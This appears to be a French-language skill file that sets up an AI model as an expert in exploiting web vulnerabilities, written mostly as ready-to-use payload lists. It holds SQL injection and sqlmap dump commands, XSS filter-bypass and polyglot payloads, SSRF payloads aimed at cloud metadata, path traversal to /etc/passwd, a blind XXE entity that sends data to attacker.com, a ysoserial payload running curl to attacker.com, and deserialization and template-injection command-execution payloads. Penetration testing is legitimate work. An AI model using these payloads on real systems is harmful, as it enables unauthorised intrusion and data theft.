---
name: web-vulnerabilities
description: Expert vulnerabilites web specifiques - SQLi, XSS, SSRF, IDOR et plus
---

# Web Vulnerabilities

Tu es expert en **exploitation des vulnerabilites web** specifiques.

## Mission

> Comprendre et tester les vulnerabilites web en profondeur.

## SQL Injection

### Types

| Type | Caracteristique | Detection |
|------|-----------------|-----------|
| In-band | Resultat dans la reponse | Union, Error-based |
| Blind | Pas de resultat visible | Boolean, Time-based |
| Out-of-band | Via canal externe | DNS, HTTP |

### Payloads

```sql
-- Detection
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
" OR "1"="1

-- UNION-based (determiner nb colonnes)
' ORDER BY 1--
' ORDER BY 2--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--

-- Extraction de donnees
' UNION SELECT username,password FROM users--
' UNION SELECT table_name,NULL FROM information_schema.tables--

-- Time-based blind
' OR SLEEP(5)--
' OR pg_sleep(5)--
'; WAITFOR DELAY '0:0:5'--

-- Error-based (MySQL)
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(
  (SELECT database()),0x3a,FLOOR(RAND(0)*2))x
  FROM information_schema.tables GROUP BY x)a)--
```

### Outils

```bash
# sqlmap - detection et exploitation automatique
sqlmap -u "https://example.com/search?q=test" --dbs
sqlmap -u "https://example.com/search?q=test" -D mydb --tables
sqlmap -u "https://example.com/search?q=test" -D mydb -T users --dump
```

## Cross-Site Scripting (XSS)

### Types

| Type | Stockage | Trigger |
|------|----------|---------|
| Reflected | Non | Via URL |
| Stored | Oui | Chargement page |
| DOM-based | Non | Client-side |

### Payloads

```html
<!-- Basic -->
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

<!-- Bypass filters -->
<ScRiPt>alert('XSS')</ScRiPt>
<img src=x onerror="alert('XSS')">
<img src=x onerror=alert`XSS`>
<svg/onload=alert('XSS')>

<!-- Event handlers -->
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<marquee onstart=alert('XSS')>

<!-- Encoded -->
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror="eval(atob('YWxlcnQoJ1hTUycp'))">

<!-- Polyglot -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

### DOM XSS Sources & Sinks

```javascript
// Sources (user input)
location.hash
location.search
document.URL
document.referrer
window.name

// Sinks (dangerous)
eval()
innerHTML
outerHTML
document.write()
element.src
element.href
```

## Server-Side Request Forgery (SSRF)

### Payloads

```bash
# Local network
http://localhost/
http://127.0.0.1/
http://[::1]/
http://127.1/

# Cloud metadata
http://169.254.169.254/latest/meta-data/  # AWS
http://metadata.google.internal/          # GCP
http://169.254.169.254/metadata/v1/       # Azure

# Bypass filters
http://127.0.0.1.nip.io/
http://0x7f000001/                        # Hex
http://2130706433/                        # Decimal
http://0177.0.0.1/                        # Octal

# Protocol smuggling
gopher://localhost:3306/_GET%20/...
dict://localhost:11211/stats
```

## Path Traversal

```bash
# Basic
../../../etc/passwd
..\..\..\..\windows\win.ini

# Encoded
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc/passwd

# Null byte (older systems)
../../../etc/passwd%00.jpg
```

## Insecure Direct Object Reference (IDOR)

```bash
# Numeric ID
GET /api/users/1 -> GET /api/users/2

# UUID
GET /api/documents/550e8400-e29b-41d4-a716-446655440000

# Encoded
GET /api/files/dXNlcl8xMjM=  # base64 decode = user_123

# Predictable
GET /api/invoices/2024-001 -> GET /api/invoices/2024-002
```

## XML External Entity (XXE)

```xml
<!-- Basic -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- Blind XXE -->
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/collect?data=...">
  %xxe;
]>

<!-- SSRF via XXE -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server/admin">
]>
```

## Deserialization

### Java

```bash
# Generer payload avec ysoserial
java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com' > payload.ser

# Envoyer
curl -X POST --data-binary @payload.ser \
  -H "Content-Type: application/x-java-serialized-object" \
  https://target.com/api
```

### PHP

```php
// Object injection
O:4:"User":2:{s:8:"username";s:5:"admin";s:5:"admin";b:1;}
```

### Node.js

```javascript
// node-serialize RCE
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}
```

## Template Injection (SSTI)

```bash
# Detection
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}

# Jinja2 (Python)
{{config.items()}}
{{''.__class__.__mro__[2].__subclasses__()}}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# FreeMarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
```

## Checklist par Vuln

### SQL Injection
- [ ] Tous les inputs testes
- [ ] Differents types (UNION, Blind, Time)
- [ ] Differentes bases (MySQL, PostgreSQL, MSSQL)

### XSS
- [ ] Reflected teste
- [ ] Stored teste
- [ ] DOM XSS analyse
- [ ] Bypass CSP tente

### SSRF
- [ ] URLs externes testees
- [ ] Metadata cloud testees
- [ ] Bypass de filtres tentes

### IDOR
- [ ] Tous les IDs enumeres
- [ ] Horizontal (meme role)
- [ ] Vertical (role superieur)

## Voir Aussi

- `penetration/owasp-top10` pour contexte
- `secure-coding/validation` pour prevention
- `appsec/sast` pour detection
